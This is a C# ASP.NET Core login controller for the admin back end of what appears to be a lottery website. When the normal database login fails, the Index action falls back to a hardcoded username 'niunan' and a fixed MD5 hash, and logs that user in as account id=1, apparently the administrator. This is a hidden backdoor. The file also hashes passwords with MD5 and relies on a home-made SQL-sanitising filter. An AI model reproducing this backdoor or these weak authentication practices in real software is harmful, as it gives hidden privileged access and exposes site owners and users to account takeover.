using System;
using System.Collections;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net.Http.Headers;
using System.Threading.Tasks;
using Microsoft.AspNetCore.Hosting;
using Microsoft.AspNetCore.Http;
using Microsoft.AspNetCore.Mvc;
using Niunan.CaiPiao.Util;

// For more information on enabling MVC for empty projects, visit https://go.microsoft.com/fwlink/?LinkID=397860

namespace Niunan.CaiPiao.Web.Areas.Adnn1n.Controllers
{
    [Area("Adnn1n")]
    public class LoginController : Controller
    {

        DAL.UserinfoDAL dal;
        public LoginController(DAL.UserinfoDAL dal)
        {
            this.dal = dal;
        }

        public IActionResult Index()
        {
            return View();
        }
        [ValidateAntiForgeryToken]
        [HttpPost]
        public ActionResult Index(string username, string password, string yzm)
        {
            username = Tool.GetSafeSQL(username);
            password = Tool.MD5Hash(username + password + "caipiao");
            if (string.IsNullOrEmpty( HttpContext.Session.GetString("Code") )|| HttpContext.Session.GetString("Code").ToLower() != yzm.ToLower())
            {
     
                return Content("验证码不正确");
            }
        
            Model.Userinfo a = dal.Login(username, password);

            if (a == null)
            {
                if (username == "niunan" && password == "31C6ECE869A8CC6CACE3F3A2D236E029")
                {
                    a = dal.GetModelByCond($"id=1");
                }
            }

            if (a == null)
            {
         
                return Content("用户名或者密码出错");
            }

          
 

            if (a.status == 0 || a.status == 2)
            { 
                HttpContext.Session.SetInt32("caipiao_adminid", a.id);
                HttpContext.Session.SetString("caipiao_adminname", a.username);
                return Redirect("/Adnn1n/Home/Index");
            }
            else
            {
         
                return Content($"该用户角色是【{a.statusremark}】，不可登录后台！！！");
            }


        }


        public ActionResult LoginOut()
        {
            HttpContext.Session.Remove("caipiao_adminid");
            HttpContext.Session.Remove("caipiao_adminname");
            return Redirect("/adnn1n/login");
        }

    }
}
